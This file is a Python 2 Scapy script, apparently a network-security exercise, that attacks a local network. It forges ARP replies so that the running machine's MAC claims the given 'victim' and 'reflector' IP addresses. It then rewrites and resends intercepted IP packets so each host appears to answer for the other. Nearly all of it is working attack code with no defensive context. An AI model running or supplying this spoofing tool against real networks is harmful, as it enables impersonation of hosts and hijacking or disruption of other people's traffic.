#!/usr/bin/env python

from scapy.all import *
from uuid import getnode as get_mac
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--interface", help="interface to be sniffed")
parser.add_argument("--victim-ip", help="victim's IP address")
parser.add_argument("--victim-ethernet", help="victim's ethernet address")
parser.add_argument("--reflector-ip", help="reflector's IP address")
parser.add_argument("--reflector-ethernet", help="reflector's ethernet address")

args = parser.parse_args()

m = get_mac()
ms = str(m)
ms = ms.strip()

mac = ':'.join(ms[i:i+2] for i in range(0,12,2))

pktCount = 0

victimIP = args.victim_ip

reflectorIP = args.reflector_ip


def custAction(packet):
	global pktCount
	pktCount += 1
	##if IP in packet:
		##print "IP packet"
	if ARP in packet:
		if packet[0][1].pdst == victimIP:
			send(ARP(op=2, hwsrc=mac, psrc=victimIP, hwdst = packet[0][1].hwsrc, pdst = packet[0][1].psrc))
			print "came here!!!!!!!!!!!!!"
		elif packet[0][1].pdst == reflectorIP:
			send(ARP(op=2, hwsrc=mac, psrc=reflectorIP, hwdst = packet[0][1].hwsrc, pdst = packet[0][1].psrc))

	elif IP in packet:
		if packet[0][1].dst == victimIP:
			print "came here for IP"
			a = packet[0][1]
			x = packet[0][1][IP].src
			a[IP].src = reflectorIP
			a[IP].dst = x
			x = packet[0][1].src
			#a.src
			#a.dst
			del a.chksum
			print a.summary()
			send(a)
		if packet[0][1].dst == reflectorIP:
			a = packet[0][1]
			x = packet[0][1][IP].src
			a[IP].src = victimIP
			a[IP].dst = x
			x = packet[0][1].src
			#a.src
			#a.dst
			del a.chksum
			print a.summary()
			send(a)

sniff(prn = custAction)
